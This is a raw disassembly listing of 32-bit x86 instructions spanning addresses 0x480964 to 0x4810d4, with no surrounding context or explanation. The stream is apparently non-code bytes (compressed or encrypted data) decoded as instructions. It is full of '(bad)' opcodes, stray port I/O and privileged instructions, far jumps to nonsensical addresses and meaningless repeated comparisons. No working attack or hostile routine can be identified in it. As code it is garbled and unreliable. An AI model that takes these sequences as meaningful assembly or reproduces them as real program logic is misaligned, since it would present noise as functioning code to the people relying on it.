  480964:	adc    DWORD PTR [esi+eiz*2-0x5bae6bbd],ecx
  48096b:	shr    DWORD PTR [esi+0x6a121b3],1
  480971:	or     ch,BYTE PTR [edi+eax*1-0x7e]
  480975:	xchg   BYTE PTR [edi],ah
  480977:	pop    eax
  480978:	pop    edi
  480979:	aaa    
  48097a:	cmp    WORD PTR [edx-0x76],0x8a03
  480980:	push   esi
  480981:	loop   0x4809ae
  480983:	sbb    eax,0x975146c
  480988:	mov    si,0x63b3
  48098c:	shl    DWORD PTR [edx-0x4c],cl
  48098f:	in     al,dx
  480990:	ds mul edx
  480993:	adc    BYTE PTR [edi+0x4b385480],ah
  480999:	enter  0x1a41,0x78
  48099d:	ret    
  48099e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48099f:	jg     0x480945
  4809a1:	test   BYTE PTR [eax+ebp*1],dl
  4809a4:	das    
  4809a5:	pop    es
  4809a6:	pop    eax
  4809a7:	adc    bh,ch
  4809a9:	mov    ebx,DWORD PTR [eax]
  4809ab:	add    eax,0xf1133b47
  4809b0:	inc    esi
  4809b1:	mov    DWORD PTR [eax],eax
  4809b3:	cmp    edx,DWORD PTR [eax]
  4809b5:	out    0x8f,eax
  4809b7:	mov    edx,0xa9dd641e
  4809bc:	jne    0x480955
  4809be:	out    dx,eax
  4809bf:	sub    DWORD PTR [ecx+eax*4-0x41b7de09],ebp
  4809c6:	adc    eax,0x18325554
  4809cb:	or     al,0x11
  4809cd:	repnz pop edx
  4809cf:	mov    edi,0x7b84319d
  4809d4:	mov    edi,0x90ebe094
  4809d9:	in     al,0x56
  4809db:	sub    BYTE PTR [ecx],bh
  4809dd:	pop    ebp
  4809de:	les    edx,FWORD PTR [eax]
  4809e0:	pop    esi
  4809e1:	dec    eax
  4809e2:	enter  0x843,0xa4
  4809e6:	adc    BYTE PTR [edx+ebx*2+0x3a],dh
  4809ea:	test   al,0xa
  4809ec:	push   edx
  4809ed:	(bad)  
  4809ee:	mov    bh,0x0
  4809f0:	scas   al,BYTE PTR es:[edi]
  4809f1:	pop    ebx
  4809f2:	test   esi,esp
  4809f4:	sbb    BYTE PTR [ebx+0x47240e17],cl
  4809fa:	or     cl,BYTE PTR [ebx-0x2b]
  4809fd:	and    DWORD PTR [edi],edi
  4809ff:	jb     0x480a09
  480a01:	push   0x140ac835
  480a06:	es xchg esi,eax
  480a08:	rcl    DWORD PTR [ecx],cl
  480a0a:	int3   
  480a0b:	imul   esp,DWORD PTR [eax+0x77],0xffffff9d
  480a0f:	(bad)  
  480a10:	sub    eax,0x9c006338
  480a15:	cwde   
  480a16:	dec    esp
  480a17:	dec    ebp
  480a18:	imul   ebx
  480a1a:	aas    
  480a1b:	sbb    BYTE PTR [ecx+eax*1],0x52
  480a1f:	pop    ss
  480a20:	adc    DWORD PTR [eax-0x6b],edx
  480a23:	sbb    BYTE PTR [ebx],0xae
  480a26:	mov    BYTE PTR [esi-0x1695a07c],0x50
  480a2d:	lea    esi,[edi+0x3]
  480a30:	outs   dx,DWORD PTR ds:[esi]
  480a31:	xor    ah,ch
  480a33:	sbb    eax,0xc8d10535
  480a38:	loopne 0x480ab8
  480a3a:	push   cs
  480a3b:	ss pop edi
  480a3d:	or     eax,DWORD PTR [edx+0x18]
  480a40:	adc    ecx,DWORD PTR [esi+0x5969568a]
  480a46:	jne    0x480aa2
  480a48:	jo     0x480a6a
  480a4a:	add    DWORD PTR [esi],0xc077647c
  480a50:	xchg   esi,eax
  480a51:	mov    dl,BYTE PTR [esi+0x925afb7]
  480a57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  480a58:	div    ebx
  480a5a:	pop    es
  480a5b:	sub    eax,0x5c1f0201
  480a60:	add    eax,ebp
  480a62:	icebp  
  480a63:	sti    
  480a64:	or     DWORD PTR ds:0x4316bb0e,ebp
  480a6a:	jmp    0x480ab6
  480a6c:	mov    ds:0xf0f0975,eax
  480a71:	shl    BYTE PTR [edi],cl
  480a73:	mov    ch,0x35
  480a75:	mov    BYTE PTR [ebx-0x327c0eb3],0xae
  480a7c:	retf   
  480a7d:	push   eax
  480a7e:	daa    
  480a7f:	add    BYTE PTR [ebx+0x74],dl
  480a82:	adc    al,0xeb
  480a84:	or     DWORD PTR [esi-0x573056a2],eax
  480a8a:	das    
  480a8b:	jne    0x480a66
  480a8d:	ds jo  0x480ae5
  480a90:	mov    ds,WORD PTR [edx]
  480a92:	int3   
  480a93:	fisttp WORD PTR [ebx-0x17fdc3d3]
  480a99:	test   al,0x93
  480a9b:	and    eax,0x236fc057
  480aa0:	jbe    0x480b21
  480aa2:	pop    esi
  480aa3:	dec    edi
  480aa4:	add    al,0x39
  480aa6:	inc    esp
  480aa7:	test   al,0x8e
  480aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  480aaa:	sahf   
  480aab:	fcomp  DWORD PTR [edi-0x77]
  480aae:	inc    edi
  480aaf:	or     al,0x74
  480ab1:	jmp    0xd249b000
  480ab6:	pop    edi
  480ab7:	and    DWORD PTR ds:0xa078de7,ebx
  480abd:	mov    DWORD PTR [esi+0x2f],0x11288f3c
  480ac4:	loope  0x480aa9
  480ac6:	dec    eax
  480ac7:	mov    al,0x6f
  480ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  480aca:	xor    DWORD PTR [esi-0x6],ebx
  480acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  480ace:	call   0x4ec911dc
  480ad3:	add    al,0xe
  480ad5:	push   fs
  480ad7:	dec    eax
  480ad8:	xor    dh,BYTE PTR [edx]
  480ada:	or     DWORD PTR [ecx],ecx
  480adc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  480add:	xchg   ecx,eax
  480ade:	mov    esp,0x86029fc6
  480ae3:	xor    BYTE PTR [ecx+0x4bbf9868],ah
  480ae9:	inc    ebx
  480aea:	pop    esp
  480aeb:	push   ecx
  480aec:	and    esp,DWORD PTR [edi-0x60]
  480aef:	xchg   DWORD PTR [edi+0x3c8cfe7a],esi
  480af5:	add    al,0x67
  480af7:	hlt    
  480af8:	test   DWORD PTR [ebx+0x4c908959],edx
  480afe:	mov    al,0x18
  480b00:	mov    esp,0xa4115302
  480b05:	(bad)  
  480b06:	outs   dx,DWORD PTR ds:[esi]
  480b07:	cwde   
  480b08:	cmp    BYTE PTR ds:[edx+0x6],cl
  480b0c:	add    ch,al
  480b0e:	mov    eax,ebp
  480b10:	jecxz  0x480b5f
  480b12:	or     DWORD PTR [edi+ebp*2],ecx
  480b15:	cmp    dh,BYTE PTR [eax-0x7a1d0bfa]
  480b1b:	xchg   edi,eax
  480b1c:	cmp    al,0xad
  480b1e:	push   eax
  480b1f:	cli    
  480b20:	lds    eax,FWORD PTR [ebx+0x7d4ad7e0]
  480b26:	mov    cl,0x46
  480b28:	(bad)  
  480b29:	cmp    eax,edi
  480b2b:	je     0x480b42
  480b2d:	js     0x480b97
  480b2f:	hlt    
  480b30:	test   DWORD PTR [edi-0x3a5b4580],0x9388bf5d
  480b3a:	dec    edi
  480b3b:	rol    DWORD PTR [eax-0x74],0x10
  480b3f:	mov    ecx,0x8b13191e
  480b44:	nop
  480b45:	pop    ss
  480b46:	mov    esi,0x242087fc
  480b4b:	push   edx
  480b4c:	xor    ecx,ecx
  480b4e:	mov    edx,0x140eb007
  480b53:	pop    ebx
  480b54:	aas    
  480b55:	addr16 and al,0xf9
  480b58:	add    eax,DWORD PTR [edx]
  480b5a:	xchg   esp,ecx
  480b5c:	mov    ecx,0xa2e9950
  480b61:	bound  ecx,QWORD PTR [ebx+0x78]
  480b64:	lahf   
  480b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  480b66:	mov    al,0xe0
  480b68:	aas    
  480b69:	mov    eax,0x446098e
  480b6e:	iret   
  480b6f:	inc    edx
  480b70:	push   ebp
  480b71:	push   esp
  480b72:	push   esp
  480b73:	dec    edi
  480b74:	dec    esi
  480b75:	xlat   BYTE PTR ds:[ebx]
  480b76:	rol    BYTE PTR [ecx],0xcf
  480b79:	pushf  
  480b7a:	and    eax,0x1283884d
  480b7f:	inc    DWORD PTR [edi+0x5614e01a]
  480b85:	add    DWORD PTR [ebx-0x15],0xffffffa7
  480b89:	jl     0x480b47
  480b8b:	sub    eax,0x7f32470a
  480b90:	add    al,0xd
  480b92:	jne    0x480b38
  480b94:	adc    dh,BYTE PTR [eax-0x57]
  480b97:	mov    eax,0x1b1f10bb
  480b9c:	jne    0x480bdc
  480b9e:	test   BYTE PTR [ecx],dl
  480ba0:	xor    eax,0xa02078c9
  480ba5:	dec    esp
  480ba6:	pop    esi
  480ba7:	data16 cld 
  480ba9:	dec    ebp
  480baa:	xchg   esi,eax
  480bab:	xor    BYTE PTR [eax],dl
  480bad:	mov    eax,0xb0231210
  480bb2:	mov    ecx,0x146b4383
  480bb7:	sbb    eax,0x431966ab
  480bbc:	add    DWORD PTR [ecx],ecx
  480bbe:	fdivr  DWORD PTR ds:0xc0054e4a
  480bc4:	xlat   BYTE PTR ds:[ebx]
  480bc5:	push   0xffffff9a
  480bc7:	add    al,0x40
  480bc9:	and    BYTE PTR [esi],dl
  480bcb:	aad    0xdf
  480bcd:	or     dl,dl
  480bcf:	or     BYTE PTR [ecx+0x71],bh
  480bd2:	call   0xf267:0x9432aaae
  480bd9:	(bad)  
  480bda:	retf   0x79b4
  480bdd:	inc    edx
  480bde:	inc    ecx
  480bdf:	inc    ecx
  480be0:	jmp    0x3d10:0xdf3b0d43
  480be7:	and    dh,BYTE PTR [eax]
  480be9:	pushf  
  480bea:	pop    edi
  480beb:	jmp    0x480bf9
  480bed:	jnp    0x480c60
  480bef:	push   edi
  480bf0:	loopne 0x480b7b
  480bf2:	pop    es
  480bf3:	test   eax,0x4fe85188
  480bf8:	test   eax,0x4fe74da6
  480bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  480bfe:	and    BYTE PTR [eax],dl
  480c00:	push   esp
  480c01:	pop    ds
  480c02:	pop    ds
  480c03:	aas    
  480c04:	leave  
  480c05:	inc    ebx
  480c06:	dec    esi
  480c07:	ins    BYTE PTR es:[edi],dx
  480c08:	ja     0x480c73
  480c0a:	fwait
  480c0b:	dec    esp
  480c0c:	mov    al,al
  480c0e:	retf   
  480c0f:	or     edi,DWORD PTR [ecx]
  480c11:	jo     0x480bae
  480c13:	dec    esp
  480c14:	mov    bh,BYTE PTR [eax]
  480c16:	xchg   edi,eax
  480c17:	inc    eax
  480c18:	scas   al,BYTE PTR es:[edi]
  480c19:	lods   eax,DWORD PTR ds:[esi]
  480c1a:	sar    bh,cl
  480c1c:	jg     0x480c6e
  480c1e:	jb     0x480c7b
  480c20:	mov    fs,WORD PTR [eax+esi*4+0x50]
  480c24:	outs   dx,DWORD PTR ds:[esi]
  480c25:	loope  0x480c43
  480c27:	leave  
  480c28:	sbb    BYTE PTR [esp+edx*2-0x18],0x54
  480c2d:	add    DWORD PTR [ecx-0x63e67f1c],ebx
  480c33:	pop    eax
  480c34:	leave  
  480c35:	or     BYTE PTR [ecx+ecx*8],0x20
  480c39:	pushf  
  480c3a:	pop    eax
  480c3b:	push   ecx
  480c3c:	jb     0x480c62
  480c3e:	add    esi,DWORD PTR [edx+0x5c]
  480c41:	pop    eax
  480c42:	pop    esp
  480c43:	or     al,0xc8
  480c45:	and    eax,0x90608903
  480c4a:	xchg   edi,eax
  480c4b:	or     al,0xc8
  480c4d:	xchg   ecx,eax
  480c4e:	pusha  
  480c4f:	shl    DWORD PTR [edi+ebp*1+0x47],0x32
  480c54:	and    al,cl
  480c56:	and    BYTE PTR fs:[ebp+0xb3076bb],bl
  480c5d:	aas    
  480c5e:	fs pop ds
  480c60:	push   eax
  480c61:	push   ss
  480c62:	stos   BYTE PTR es:[edi],al
  480c63:	rol    BYTE PTR [eax],1
  480c65:	ficomp WORD PTR [eax+0x6]
  480c68:	inc    esp
  480c69:	push   edi
  480c6a:	and    BYTE PTR [edx+0x3],ah
  480c6d:	js     0x480ca7
  480c6f:	sahf   
  480c70:	inc    edx
  480c71:	pop    ss
  480c72:	hlt    
  480c73:	rol    BYTE PTR [eax],1
  480c75:	outs   dx,BYTE PTR ds:[esi]
  480c76:	call   0x9ff03329
  480c7b:	cmp    al,BYTE PTR [edi+0x544e11f0]
  480c81:	imul   ebp,DWORD PTR [ebp+0x44],0x913a07f7
  480c88:	xor    bl,al
  480c8a:	sbb    DWORD PTR [edi],ebp
  480c8c:	test   BYTE PTR [edx],dh
  480c8e:	test   BYTE PTR [esi-0x1dbba1b0],dl
  480c94:	push   ebx
  480c95:	test   al,0x74
  480c97:	ins    DWORD PTR es:[edi],dx
  480c98:	add    eax,DWORD PTR [eax+0x16]
  480c9b:	lahf   
  480c9c:	and    DWORD PTR [esi+ecx*1],edx
  480c9f:	data16 jnp 0x480ca4
  480ca2:	in     eax,0x4a
  480ca4:	pop    eax
  480ca5:	repnz mov esp,0x8030427c
  480cab:	pop    es
  480cac:	or     DWORD PTR [eax],esi
  480cae:	add    eax,DWORD PTR [ebp+0x48e3d8c]
  480cb4:	daa    
  480cb5:	and    esp,ebx
  480cb7:	adc    bh,BYTE PTR [eax]
  480cb9:	out    0x43,eax
  480cbb:	pop    eax
  480cbc:	repnz inc esp
  480cbe:	nop
  480cbf:	ds add al,0x4f
  480cc2:	jno    0x480d05
  480cc4:	jp     0x480cbd
  480cc6:	jg     0x480c8e
  480cc8:	inc    esi
  480cc9:	inc    eax
  480cca:	mov    bh,BYTE PTR [edx]
  480ccc:	add    ecx,DWORD PTR [eax+0x56a5bc01]
  480cd2:	push   esi
  480cd3:	sahf   
  480cd4:	inc    eax
  480cd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  480cd6:	test   BYTE PTR [edi+0x2a],ah
  480cd9:	sahf   
  480cda:	dec    esi
  480cdb:	xor    al,0x3
  480cdd:	xchg   edi,eax
  480cde:	or     BYTE PTR [ebx],0xf
  480ce1:	jle    0x480d11
  480ce3:	adc    bl,BYTE PTR [ebp-0x1f71ea03]
  480ce9:	mov    ebp,DWORD PTR [eax+0x79]
  480cec:	fadd   QWORD PTR [edi]
  480cee:	adc    BYTE PTR [edi-0x2773c36c],ah
  480cf4:	idiv   ah
  480cf6:	(bad)  
  480cf7:	mov    ch,0xde
  480cf9:	inc    ebx
  480cfa:	xor    eax,DWORD PTR [ecx+0x3f3013fe]
  480d00:	cwde   
  480d01:	stos   BYTE PTR es:[edi],al
  480d02:	sahf   
  480d03:	and    DWORD PTR [eax+edx*4+0x2b527f92],ecx
  480d0a:	inc    ebx
  480d0b:	or     eax,0x34a1335d
  480d10:	ror    BYTE PTR [ebp-0x246ec7fc],cl
  480d16:	add    al,0xf6
  480d18:	add    al,0x74
  480d1a:	and    eax,0x1869d9f5
  480d1f:	repz push esi
  480d21:	pop    edx
  480d22:	dec    ebx
  480d23:	mov    eax,0xc85385b6
  480d28:	and    eax,0x15128f0b
  480d2d:	or     dl,dh
  480d2f:	add    DWORD PTR [esi+0x7f],edx
  480d32:	fldenv [ebx-0x61]
  480d35:	push   ss
  480d36:	loopne 0x480d73
  480d38:	retf   0x5774
  480d3b:	pop    ebx
  480d3c:	fidiv  DWORD PTR [ebx+0x30]
  480d3f:	jmp    0x8040:0xee877414
  480d46:	jnp    0x480d08
  480d48:	cmp    dh,BYTE PTR [ecx]
  480d4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  480d4b:	pop    esi
  480d4c:	cwde   
  480d4d:	sub    DWORD PTR [ebx],esi
  480d4f:	scas   al,BYTE PTR es:[edi]
  480d50:	inc    ebx
  480d51:	gs sbb al,0x28
  480d54:	loope  0x480db2
  480d56:	mov    al,ds:0x255dd6ba
  480d5b:	cmovo  ebp,DWORD PTR [ebx+esi*2+0x6a]
  480d60:	enter  0xf8ab,0x80
  480d64:	xchg   ecx,eax
  480d65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  480d66:	cmp    dl,BYTE PTR [eax+0x40]
  480d69:	or     al,0x88
  480d6b:	or     BYTE PTR ds:0x5d078004,dh
  480d71:	div    DWORD PTR [eax]
  480d73:	xor    al,0xe4
  480d75:	xor    eax,0x50891eb9
  480d7a:	xor    BYTE PTR [edi],dl
  480d7c:	(bad)  
  480d7d:	aam    0xab
  480d7f:	mov    ah,0x45
  480d81:	cmp    BYTE PTR [ebp*1-0x7aa7ed08],bh
  480d88:	nop
  480d89:	aaa    
  480d8a:	cmp    DWORD PTR [ecx+0x37fe7c8d],edi
  480d90:	cmp    BYTE PTR [edi],cl
  480d92:	cmp    DWORD PTR [edx],edi
  480d94:	cmp    DWORD PTR [ecx],edi
  480d96:	cmp    DWORD PTR [ecx],edi
  480d98:	cmp    edi,DWORD PTR [edi*1+0x3939393e]
  480d9f:	cmp    DWORD PTR [edi],edi
  480da1:	and    BYTE PTR [ecx],ah
  480da3:	and    bh,BYTE PTR [ecx]
  480da5:	cmp    DWORD PTR [ecx],edi
  480da7:	cmp    DWORD PTR [ebx],esp
  480da9:	and    al,0x25
  480dab:	cmp    DWORD PTR es:[ecx],edi
  480dae:	cmp    DWORD PTR [ecx],edi
  480db0:	daa    
  480db1:	sub    BYTE PTR [ecx],ch
  480db3:	sub    bh,BYTE PTR [ecx]
  480db5:	cmp    DWORD PTR [ecx],edi
  480db7:	cmp    DWORD PTR [ebx],ebp
  480db9:	sub    al,0x2d
  480dbb:	cmp    DWORD PTR cs:[ecx],edi
  480dbe:	cmp    DWORD PTR [ecx],edi
  480dc0:	das    
  480dc1:	adc    BYTE PTR [ecx],dl
  480dc3:	adc    bh,BYTE PTR [ecx]
  480dc5:	cmp    DWORD PTR [ecx],edi
  480dc7:	cmp    DWORD PTR [ebx],edx
  480dc9:	adc    al,0x15
  480dcb:	push   ss
  480dcc:	cmp    DWORD PTR [ecx],edi
  480dce:	cmp    DWORD PTR [ecx],edi
  480dd0:	pop    ss
  480dd1:	sbb    BYTE PTR [ecx],bl
  480dd3:	sbb    bh,BYTE PTR [ecx]
  480dd5:	cmp    DWORD PTR [ecx],edi
  480dd7:	cmp    DWORD PTR [ebx],ebx
  480dd9:	sbb    al,0x1d
  480ddb:	push   ds
  480ddc:	cmp    DWORD PTR [ecx],edi
  480dde:	cmp    DWORD PTR [ecx],edi
  480de0:	pop    ds
  480de1:	add    BYTE PTR [ecx],al
  480de3:	add    dh,al
  480de5:	cmp    DWORD PTR [ecx],edi
  480de7:	cmp    DWORD PTR [ebx],eax
  480de9:	add    al,0x5
  480deb:	das    
  480dec:	add    BYTE PTR [ecx+0x46],bh
  480def:	loop   0x480e4a
  480df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  480df2:	enter  0xa169,0xc6
  480df6:	push   cs
  480df7:	and    al,0xe7
  480df9:	jns    0x480d99
  480dfb:	out    0xb8,eax
  480dfd:	sbb    al,0xb0
  480dff:	adc    al,0xa8
  480e01:	int    0xe7
  480e03:	jns    0x480da3
  480e05:	or     al,0xa0
  480e07:	add    al,0x98
  480e09:	cld    
  480e0a:	mov    al,ds:0xf3cf3c90
  480e0f:	cmp    al,0xf4
  480e11:	mov    ah,ch
  480e13:	and    ah,0xf3
  480e16:	cmp    al,0xcf
  480e18:	repz js 0x480df7
  480e1b:	jo     0x480df1
  480e1d:	push   0xcf3cf3cf
  480e22:	int3   
  480e23:	pusha  
  480e24:	les    ebx,FWORD PTR [eax-0x44]
  480e27:	push   eax
  480e28:	cmp    al,0xcf
  480e2a:	repz cmp al,0xb4
  480e2d:	dec    eax
  480e2e:	lods   al,BYTE PTR ds:[esi]
  480e2f:	inc    eax
  480e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  480e31:	repz cmp al,0xcf
  480e34:	repz cmp BYTE PTR [eax+esi*1-0xc30d76c],bl
  480e3c:	cmp    al,0xcf
  480e3e:	mov    WORD PTR [eax],fs
  480e40:	test   BYTE PTR [eax],bl
  480e42:	jl     0x480e54
  480e44:	cmp    al,0xcf
  480e46:	repz cmp al,0x74
  480e49:	or     BYTE PTR [eax+eax*1+0x64],ch
  480e4d:	jns    0x480ded
  480e4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  480e50:	stc    
  480e51:	clc    
  480e52:	push   0xe854f05c
  480e57:	out    0x79,eax
  480e59:	sahf   
  480e5a:	out    0x4c,eax
  480e5c:	loopne 0x480ea2
  480e5e:	fdivr  DWORD PTR [esi+ebx*4]
  480e61:	out    0x79,eax
  480e63:	sahf   
  480e64:	shl    BYTE PTR [eax+ecx*8],1
  480e67:	sub    al,0xc0
  480e69:	and    al,0x79
  480e6b:	sahf   
  480e6c:	out    0x79,eax
  480e6e:	mov    eax,0xa814b01c
  480e73:	repz jns 0x480e14
  480e76:	out    0xc,eax
  480e78:	mov    al,ds:0x9ffc9804
  480e7d:	iret   
  480e7e:	repz cmp al,0x4f
  480e81:	nop
  480e82:	hlt    
  480e83:	mov    ah,ch
  480e85:	and    ah,0x3c
  480e88:	iret   
  480e89:	repz cmp al,0x78
  480e8c:	fdiv   QWORD PTR [eax-0x2c]
  480e8f:	push   0xf3cf3cf3
  480e94:	int3   
  480e95:	pusha  
  480e96:	les    ebx,FWORD PTR [eax-0x44]
  480e99:	jae    0x480e63
  480e9b:	cdq    
  480e9c:	test   al,0xc7
  480e9e:	in     al,dx
  480e9f:	mov    ds:0x48748168,al
  480ea4:	clc    
  480ea5:	adc    eax,0x9c6854b8
  480eaa:	das    
  480eab:	xchg   ebp,eax
  480eac:	mov    eax,ds:0xa2f33ad8
  480eb1:	das    
  480eb2:	push   0xbc560124
  480eb7:	lds    edi,FWORD PTR [eax+0x31583a34]
  480ebd:	mov    ch,BYTE PTR [eax-0x37]
  480ec0:	imul   DWORD PTR [edi+0x7c]
  480ec3:	ja     0x480ebb
  480ec5:	sub    DWORD PTR [edx+eax*4-0x632b5eeb],esi
  480ecc:	pop    ds
  480ecd:	sub    bl,BYTE PTR [esi+0x89c8725]
  480ed3:	pop    ss
  480ed4:	dec    ebp
  480ed5:	mov    ds:0x2e56406c,eax
  480eda:	in     al,0x54
  480edc:	mov    ds:0x8a3ac6c,eax
  480ee1:	out    dx,eax
  480ee2:	sbb    eax,0xeca420f2
  480ee7:	ss or  al,0x1e
  480eea:	pop    eax
  480eeb:	and    DWORD PTR [edi],eax
  480eed:	jns    0x480e71
  480eef:	pop    ss
  480ef0:	jo     0x480e97
  480ef2:	inc    edx
  480ef3:	adc    al,0xa5
  480ef5:	or     edi,ebx
  480ef7:	jnp    0x480f00
  480ef9:	int3   
  480efa:	scas   al,BYTE PTR es:[edi]
  480efb:	hlt    
  480efc:	dec    ax
  480efe:	push   es
  480eff:	inc    eax
  480f00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  480f01:	adc    esi,ebp
  480f03:	rol    BYTE PTR [edi],0x8f
  480f06:	add    eax,0x820110a8
  480f0b:	inc    edx
  480f0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  480f0d:	stc    
  480f0e:	sahf   
  480f0f:	ja     0x480eff
  480f11:	(bad)  
  480f12:	cld    
  480f13:	cs adc al,0x2c
  480f16:	push   es
  480f17:	adc    al,0xa7
  480f19:	sub    BYTE PTR [eax],al
  480f1b:	test   BYTE PTR ds:[eax+0x6f6d840d],al
  480f22:	outs   dx,BYTE PTR ds:[esi]
  480f23:	bound  ecx,QWORD PTR ds:0x86a90704
  480f29:	push   edi
  480f2a:	pop    es
  480f2b:	sub    DWORD PTR [ebx],esi
  480f2d:	cmp    eax,DWORD PTR [edx+0x6849d41]
  480f33:	xor    BYTE PTR [ecx],ah
  480f35:	jae    0x480eef
  480f37:	inc    esp
  480f38:	push   eax
  480f39:	add    edi,DWORD PTR [edi+edi*1+0x7]
  480f3d:	js     0x480fab
  480f3f:	or     al,0x22
  480f41:	adc    DWORD PTR [edi-0x252f2fdc],0x44
  480f48:	cmp    DWORD PTR [eax],edi
  480f4a:	aas    
  480f4b:	and    ebp,ebx
  480f4d:	adc    al,0xf0
  480f4f:	adc    ecx,DWORD PTR [ebx]
  480f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  480f52:	mov    eax,ds:0x841cce08
  480f57:	dec    eax
  480f58:	pop    es
  480f59:	test   DWORD PTR [ecx+0x3a],edi
  480f5c:	das    
  480f5d:	add    BYTE PTR [ebx+0x44505043],cl
  480f63:	sbb    al,0x88
  480f65:	or     eax,DWORD PTR ds:0x140fe1dc
  480f6b:	loope  0x480fa5
  480f6d:	(bad)  
  480f6e:	xor    BYTE PTR [ecx],al
  480f70:	push   esi
  480f71:	push   0x230aa5a8
  480f76:	in     al,0x1b
  480f78:	mov    ecx,0x4689349d
  480f7d:	inc    eax
  480f7e:	pop    esi
  480f7f:	push   ss
  480f80:	push   cs
  480f81:	dec    edx
  480f82:	cmovo  esi,DWORD PTR [esp+edi*1]
  480f86:	inc    esi
  480f87:	enter  0xa811,0x4
  480f8b:	sahf   
  480f8c:	mov    edx,0x78283bd1
  480f91:	adc    bh,BYTE PTR [ebx]
  480f93:	adc    eax,0x83191574
  480f98:	js     0x480f58
  480f9a:	adc    DWORD PTR [eax*4+0x578813c2],ebx
  480fa1:	adc    cl,BYTE PTR [ebx+0x5a923840]
  480fa7:	and    BYTE PTR [ebx+0x11],ah
  480faa:	pop    eax
  480fab:	sti    
  480fac:	xor    al,0x2c
  480fae:	rol    ebx,0x1
  480fb1:	ret    0xc950
  480fb4:	das    
  480fb5:	cmp    al,0x78
  480fb7:	inc    edi
  480fb8:	or     ch,BYTE PTR [ebp+0x8bc1a54]
  480fbe:	ins    DWORD PTR es:[edi],dx
  480fbf:	mov    eax,DWORD PTR [esi]
  480fc1:	push   eax
  480fc2:	push   edi
  480fc3:	add    BYTE PTR [eax+0x58d51ce0],0x78
  480fca:	cmp    BYTE PTR [eax],bh
  480fcc:	or     eax,esp
  480fce:	push   ecx
  480fcf:	sti    
  480fd0:	sub    BYTE PTR [edi+ebp*2+0x24],bh
  480fd4:	cmp    DWORD PTR [ebx],eax
  480fd6:	xor    BYTE PTR [ecx],bl
  480fd8:	shl    BYTE PTR [ebp+0x88c130c],cl
  480fde:	cmc    
  480fdf:	dec    edi
  480fe0:	sbb    DWORD PTR [eax-0x307be000],ebp
  480fe6:	mov    eax,ds:0x615c3046
  480feb:	div    BYTE PTR [edi+0x584c2a5e]
  480ff1:	loope  0x48104a
  480ff3:	ficom  DWORD PTR [ecx+ecx*1-0x11e12f55]
  480ffa:	add    DWORD PTR [eax-0x1d20af38],edx
  481000:	pop    es
  481001:	sub    BYTE PTR [esi+0x3c],al
  481004:	iret   
  481005:	iret   
  481006:	cmp    ch,BYTE PTR [ecx+0x2d]
  481009:	(bad)  
  48100a:	call   0x7bd05107
  48100f:	mov    BYTE PTR [edx+0x67],bh
  481012:	push   cs
  481013:	inc    eax
  481014:	out    dx,al
  481015:	fs mov eax,0xa564910e
  48101b:	loopne 0x481080
  48101d:	sub    al,0x6c
  48101f:	call   0x20a3b727
  481024:	cmp    BYTE PTR [eax+0x4c53e477],al
  48102a:	rcl    BYTE PTR [edi-0x7b0c0354],cl
  481030:	fnstcw WORD PTR [ebp-0x2]
  481033:	aad    0xa6
  481035:	mov    ds:0x230369cc,eax
  48103a:	loopne 0x48103d
  48103c:	(bad)
  481041:	pop    edi
  481042:	push   0x42a6dc15
  481047:	lea    eax,[edx+edi*4-0x22ca3b77]
  48104e:	mov    eax,ds:0x39c1a201
  481053:	or     ah,BYTE PTR [edi-0x363f9beb]
  481059:	xlat   BYTE PTR ds:[ebx]
  48105a:	fisub  WORD PTR ds:0xe810305c
  481060:	pop    edx
  481061:	arpl   WORD PTR [edi+ebx*8],di
  481064:	daa    
  481065:	and    al,0x2
  481067:	inc    esp
  481068:	mov    BYTE PTR [edi-0x2a],ah
  48106b:	pop    ebp
  48106c:	push   0x4b
  48106e:	xchg   ebx,eax
  48106f:	dec    edx
  481070:	jecxz  0x481099
  481072:	push   edx
  481073:	and    eax,0x5421ccb7
  481078:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  48107a:	add    dh,BYTE PTR [eax+0x11]
  48107d:	outs   dx,DWORD PTR ds:[esi]
  48107e:	pop    ecx
  48107f:	mov    dl,BYTE PTR [edi]
  481081:	or     DWORD PTR [edx-0x38],edi
  481084:	dec    edi
  481085:	add    cl,BYTE PTR [esi+0x6f]
  481088:	add    BYTE PTR [edi+0x4b],cl
  48108b:	adc    BYTE PTR [esi+0x697f5189],ch
  481091:	adc    eax,DWORD PTR [eax-0x59]
  481094:	or     ecx,edi
  481096:	bound  ebp,QWORD PTR [edi+0x8]
  481099:	pop    ds
  48109a:	imul   ebp,DWORD PTR [ebx],0xde524c01
  4810a0:	jns    0x4810a2
  4810a2:	pop    edi
  4810a3:	in     eax,0xf2
  4810a5:	mov    bh,0xfc
  4810a7:	dec    ecx
  4810a8:	outs   dx,BYTE PTR ds:[si]
  4810aa:	outs   dx,DWORD PTR ds:[esi]
  4810ab:	jb     0x481112
  4810ad:	mov    DWORD PTR [ecx+0x6c],0x594a076c
  4810b4:	ss in  al,dx
  4810b6:	push   esp
  4810b7:	outs   dx,DWORD PTR ds:[esi]
  4810b8:	pop    ds
  4810b9:	or     bh,bh
  4810bb:	and    DWORD PTR [edi-0x1c],ecx
  4810be:	xchg   esp,eax
  4810bf:	es mov bh,0xb3
  4810c2:	test   eax,0x14468d0
  4810c7:	mov    WORD PTR [esi-0x80],?
  4810ca:	test   al,0xc3
  4810cc:	pop    ebx
  4810cd:	lock mov ds:0x482e543f,eax
  4810d3:	iret   
  4810d4:	xor    DWORD PTR ds:0xa0366a78,ebx
